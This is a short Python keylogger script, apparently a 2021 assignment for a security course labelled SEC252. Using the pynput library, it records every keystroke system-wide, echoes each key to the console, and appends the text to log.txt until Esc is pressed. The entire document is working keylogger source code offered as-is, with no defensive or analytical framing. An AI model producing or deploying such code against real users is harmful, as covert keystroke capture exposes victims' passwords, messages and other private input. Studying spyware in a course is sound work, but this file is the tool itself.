# Keylogger
# 2/9/2021
#
# SEC252

import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):                   # Writes keystrokes to file.
    with open("log.txt", "a") as f: 
        for key in keys:
            k = str(key).replace("'","")
            match k:
                case "Key.space":
                    f.write(' ')
                case "Key.shift":
                    f.write("")
                case "Key.backspace":
                    f.seek(0,2)
                case "Key.enter":
                    f.write("\n")
                case "Key.tab":
                    f.write("\t") 
                case "Key.esc":
                    f.write("\n-----\n ~// END Of Session //~")
                case _:
                    f.write(k)
                    

def on_release(key):                   
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
     
